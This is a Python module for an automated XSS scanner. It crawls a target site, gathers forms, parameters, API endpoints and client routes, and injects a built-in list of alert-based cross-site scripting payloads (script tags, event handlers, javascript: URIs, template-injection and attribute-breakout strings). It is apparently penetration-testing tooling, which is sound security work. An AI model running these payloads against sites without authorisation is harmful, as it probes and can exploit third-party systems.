#!/usr/bin/env python3
"""
Hybrid Website XSS Scanner Module
For websites with both traditional and modern features
Author: AI Assistant
Version: 1.0
"""

import requests
import re
import urllib.parse
import time
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup

# Try to import Playwright
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

class HybridScanner:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Hybrid payloads - combination of traditional and modern
        self.payloads = {
            'traditional': [
                '<script>alert("XSS_HYBRID_CONFIRMED")</script>',
                '<img src=x onerror=alert("XSS_HYBRID_CONFIRMED")>',
                '<svg onload=alert("XSS_HYBRID_CONFIRMED")>',
                '<iframe src="javascript:alert(\'XSS_HYBRID_CONFIRMED\')">',
                '<body onload=alert("XSS_HYBRID_CONFIRMED")>'
            ],
            'modern': [
                'javascript:alert("XSS_HYBRID_CONFIRMED")',
                'data:text/html,<script>alert("XSS_HYBRID_CONFIRMED")</script>',
                '{{constructor.constructor("alert(\\"XSS_HYBRID_CONFIRMED\\")")()}}',
                '{alert("XSS_HYBRID_CONFIRMED")}',
                '${alert("XSS_HYBRID_CONFIRMED")}'
            ],
            'attribute': [
                '" onmouseover="alert(\'XSS_HYBRID_CONFIRMED\')" x="',
                "' onmouseover='alert(\"XSS_HYBRID_CONFIRMED\")' x='",
                '" onfocus="alert(\'XSS_HYBRID_CONFIRMED\')" autofocus="',
                "' onfocus='alert(\"XSS_HYBRID_CONFIRMED\")' autofocus='"
            ],
            'json': [
                '{"test": "<script>alert(\\"XSS_HYBRID_CONFIRMED\\")</script>"}',
                '{"test": "javascript:alert(\\"XSS_HYBRID_CONFIRMED\\")"}',
                '{"test": "<img src=x onerror=alert(\\"XSS_HYBRID_CONFIRMED\\")>"}'
            ]
        }
        
        self.vulnerabilities = []
        self.browser = None
        self.playwright = None
        self.browser_context = None
    
    def scan(self):
        """Main scanning method for hybrid websites"""
        print(f"[HYBRID] Starting hybrid XSS scan for {self.target_url}")
        
        # Phase 1: Traditional Reconnaissance
        traditional_data = self._traditional_reconnaissance()
        
        # Phase 2: Modern Reconnaissance
        modern_data = self._modern_reconnaissance()
        
        # Phase 3: Hybrid Testing
        vulnerabilities = []
        if PLAYWRIGHT_AVAILABLE:
            vulnerabilities = self._hybrid_browser_testing(traditional_data, modern_data)
        else:
            print("[HYBRID] Playwright not available, using basic testing")
            vulnerabilities = self._hybrid_basic_testing(traditional_data, modern_data)
        
        return vulnerabilities
    
    def _traditional_reconnaissance(self):
        """Traditional reconnaissance for server-side features"""
        print("[HYBRID] Starting traditional reconnaissance...")
        
        discovered_urls = set()
        discovered_forms = []
        url_parameters = set()
        
        # Start with main URL
        discovered_urls.add(self.target_url)
        
        # Crawl up to 2 levels (less aggressive for hybrid)
        self._crawl_hybrid(self.target_url, discovered_urls, discovered_forms, url_parameters, 0, 2)
        
        # Extract URL parameters
        for url in discovered_urls:
            parsed_url = urlparse(url)
            url_params = set(parse_qs(parsed_url.query).keys())
            url_parameters.update(url_params)
        
        print(f"[HYBRID] Traditional: Found {len(discovered_urls)} URLs, {len(discovered_forms)} forms, {len(url_parameters)} URL parameters")
        
        return {
            'urls': list(discovered_urls),
            'forms': discovered_forms,
            'url_parameters': list(url_parameters)
        }
    
    def _modern_reconnaissance(self):
        """Modern reconnaissance for client-side features"""
        print("[HYBRID] Starting modern reconnaissance...")
        
        api_endpoints = set()
        client_routes = set()
        modern_parameters = set()
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            if response.status_code == 200:
                html_content = response.text
                
                # Extract API endpoints
                api_patterns = [
                    r'fetch\(["\']([^"\']+)["\']',
                    r'axios\.(?:get|post|put|delete)\(["\']([^"\']+)["\']',
                    r'/api/[^"\']+',
                    r'/v\d+/[^"\']+',
                    r'/graphql'
                ]
                
                for pattern in api_patterns:
                    matches = re.findall(pattern, html_content, re.IGNORECASE)
                    for match in matches:
                        if match and not match.startswith('#'):
                            full_url = urljoin(self.target_url, match)
                            api_endpoints.add(full_url)
                
                # Extract client routes
                route_patterns = [
                    r'router\.push\(["\']([^"\']+)["\']',
                    r'history\.pushState\([^,]+,\s*["\']([^"\']+)["\']',
                    r'window\.location\.href\s*=\s*["\']([^"\']+)["\']'
                ]
                
                for pattern in route_patterns:
                    matches = re.findall(pattern, html_content, re.IGNORECASE)
                    for match in matches:
                        if match and not match.startswith('#'):
                            full_url = urljoin(self.target_url, match)
                            client_routes.add(full_url)
                
                # Extract modern parameters
                modern_param_patterns = [
                    r'params\.(\w+)',
                    r'data\.(\w+)',
                    r'payload\.(\w+)',
                    r'useParams\(\)\.(\w+)'
                ]
                
                for pattern in modern_param_patterns:
                    matches = re.findall(pattern, html_content, re.IGNORECASE)
                    modern_parameters.update(matches)
        
        except Exception as e:
            print(f"[HYBRID] Modern reconnaissance error: {str(e)}")
        
        print(f"[HYBRID] Modern: Found {len(api_endpoints)} API endpoints, {len(client_routes)} client routes, {len(modern_parameters)} modern parameters")
        
        return {
            'api_endpoints': list(api_endpoints),
            'client_routes': list(client_routes),
            'modern_parameters': list(modern_parameters)
        }
    
    def _crawl_hybrid(self, url, discovered_urls, discovered_forms, url_parameters, current_depth, max_depth):
        """Hybrid crawling - moderate depth for mixed content"""
        if current_depth >= max_depth:
            return
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            if response.status_code != 200:
                return
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract links (less aggressive than traditional)
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href and not href.startswith('#') and not href.startswith('javascript:'):
                    full_url = urljoin(url, href)
                    parsed = urlparse(full_url)
                    base_domain = urlparse(self.target_url).netloc
                    
                    if parsed.netloc == base_domain and not self._is_static_resource(full_url):
                        if full_url not in discovered_urls:
                            discovered_urls.add(full_url)
                            # Recursively crawl new URLs
                            self._crawl_hybrid(full_url, discovered_urls, discovered_forms, url_parameters, current_depth + 1, max_depth)
            
            # Extract forms
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', ''),
                    }
                    form_data['inputs'].append(input_data)
                
                if form_data['action']:
                    form_data['action'] = urljoin(url, form_data['action'])
                else:
                    form_data['action'] = url
                
                discovered_forms.append(form_data)
            
        except Exception as e:
            print(f"[HYBRID] Error crawling {url}: {str(e)}")
    
    def _hybrid_browser_testing(self, traditional_data, modern_data):
        """Hybrid browser-based testing"""
        print("[HYBRID] Starting hybrid browser-based testing...")
        
        vulnerabilities = []
        
        if not self._init_browser():
            print("[HYBRID] Failed to initialize browser")
            return vulnerabilities
        
        try:
            # Test traditional URLs with modern payloads
            for url in traditional_data['urls']:
                parsed_url = urlparse(url)
                url_params = parse_qs(parsed_url.query)
                
                for param_name in url_params:
                    for payload_type, payloads in self.payloads.items():
                        for payload in payloads:
                            vuln = self._test_hybrid_url_parameter(url, param_name, payload, payload_type)
                            if vuln:
                                vulnerabilities.append(vuln)
            
            # Test modern API endpoints
            for endpoint in modern_data['api_endpoints']:
                for param in modern_data['modern_parameters']:
                    for payload_type, payloads in self.payloads.items():
                        for payload in payloads:
                            vuln = self._test_hybrid_api_endpoint(endpoint, param, payload, payload_type)
                            if vuln:
                                vulnerabilities.append(vuln)
            
            # Test client routes
            for route in modern_data['client_routes']:
                for param in modern_data['modern_parameters']:
                    for payload_type, payloads in self.payloads.items():
                        for payload in payloads:
                            vuln = self._test_hybrid_client_route(route, param, payload, payload_type)
                            if vuln:
                                vulnerabilities.append(vuln)
        
        finally:
            self._close_browser()
        
        return vulnerabilities
    
    def _hybrid_basic_testing(self, traditional_data, modern_data):
        """Hybrid basic testing without browser"""
        print("[HYBRID] Starting hybrid basic testing...")
        
        vulnerabilities = []
        
        # Test traditional URLs with basic requests
        for url in traditional_data['urls']:
            parsed_url = urlparse(url)
            url_params = parse_qs(parsed_url.query)
            
            for param_name in url_params:
                for payload_type, payloads in self.payloads.items():
                    for payload in payloads:
                        vuln = self._test_hybrid_url_parameter_basic(url, param_name, payload, payload_type)
                        if vuln:
                            vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _test_hybrid_url_parameter(self, url, param_name, payload, payload_type):
        """Test URL parameter using browser"""
        try:
            page = self.browser_context.new_page()
            
            # Set up dialog handler
            dialog_handled = False
            alert_message = ""
            
            def handle_dialog(dialog):
                nonlocal dialog_handled, alert_message
                dialog_handled = True
                alert_message = dialog.message
                dialog.accept()
            
            page.on("dialog", handle_dialog)
            
            # Construct test URL
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            query_params[param_name] = [payload]
            
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            # Navigate and test
            page.goto(test_url, timeout=10000)
            time.sleep(2)
            
            if dialog_handled and 'XSS_HYBRID_CONFIRMED' in alert_message:
                page.close()
                return {
                    'type': 'hybrid_xss',
                    'url': test_url,
                    'parameter': param_name,
                    'payload': payload,
                    'payload_type': payload_type,
                    'alert_message': alert_message,
                    'confidence': 'high'
                }
            
            page.close()
            return None
        
        except Exception as e:
            print(f"[HYBRID] Error testing URL parameter: {str(e)}")
            return None
    
    def _test_hybrid_api_endpoint(self, endpoint, param, payload, payload_type):
        """Test API endpoint using browser"""
        try:
            page = self.browser_context.new_page()
            
            # Set up dialog handler
            dialog_handled = False
            alert_message = ""
            
            def handle_dialog(dialog):
                nonlocal dialog_handled, alert_message
                dialog_handled = True
                alert_message = dialog.message
                dialog.accept()
            
            page.on("dialog", handle_dialog)
            
            # Test GET request
            test_url = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
            page.goto(test_url, timeout=10000)
            time.sleep(2)
            
            if dialog_handled and 'XSS_HYBRID_CONFIRMED' in alert_message:
                page.close()
                return {
                    'type': 'hybrid_api_xss',
                    'endpoint': endpoint,
                    'parameter': param,
                    'payload': payload,
                    'payload_type': payload_type,
                    'alert_message': alert_message,
                    'confidence': 'high'
                }
            
            page.close()
            return None
        
        except Exception as e:
            print(f"[HYBRID] Error testing API endpoint: {str(e)}")
            return None
    
    def _test_hybrid_client_route(self, route, param, payload, payload_type):
        """Test client route using browser"""
        try:
            page = self.browser_context.new_page()
            
            # Set up dialog handler
            dialog_handled = False
            alert_message = ""
            
            def handle_dialog(dialog):
                nonlocal dialog_handled, alert_message
                dialog_handled = True
                alert_message = dialog.message
                dialog.accept()
            
            page.on("dialog", handle_dialog)
            
            # Navigate to route with payload
            test_url = f"{route}?{param}={urllib.parse.quote(payload)}"
            page.goto(test_url, timeout=10000)
            time.sleep(3)
            
            if dialog_handled and 'XSS_HYBRID_CONFIRMED' in alert_message:
                page.close()
                return {
                    'type': 'hybrid_client_xss',
                    'route': route,
                    'parameter': param,
                    'payload': payload,
                    'payload_type': payload_type,
                    'alert_message': alert_message,
                    'confidence': 'high'
                }
            
            page.close()
            return None
        
        except Exception as e:
            print(f"[HYBRID] Error testing client route: {str(e)}")
            return None
    
    def _test_hybrid_url_parameter_basic(self, url, param_name, payload, payload_type):
        """Test URL parameter using basic requests"""
        try:
            # Construct test URL
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            query_params[param_name] = [payload]
            
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            # Send request
            response = self.session.get(test_url, timeout=self.timeout)
            
            # Check for XSS reflection
            if payload in response.text and 'XSS_HYBRID_CONFIRMED' in payload:
                return {
                    'type': 'hybrid_reflected_xss',
                    'url': test_url,
                    'parameter': param_name,
                    'payload': payload,
                    'payload_type': payload_type,
                    'confidence': 'medium'
                }
            
            return None
        
        except Exception as e:
            print(f"[HYBRID] Error testing URL parameter: {str(e)}")
            return None
    
    def _init_browser(self):
        """Initialize browser"""
        try:
            self.playwright = sync_playwright().start()
            self.browser = self.playwright.chromium.launch(
                headless=False,
                args=['--no-sandbox', '--disable-setuid-sandbox']
            )
            self.browser_context = self.browser.new_context()
            return True
        except Exception as e:
            print(f"[HYBRID] Browser init error: {str(e)}")
            return False
    
    def _close_browser(self):
        """Close browser"""
        try:
            if self.browser_context:
                self.browser_context.close()
            if self.browser:
                self.browser.close()
            if self.playwright:
                self.playwright.stop()
        except Exception as e:
            print(f"[HYBRID] Browser close error: {str(e)}")
    
    def _is_static_resource(self, url):
        """Check if URL is static resource"""
        static_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', '.pdf']
        return any(url.lower().endswith(ext) for ext in static_extensions)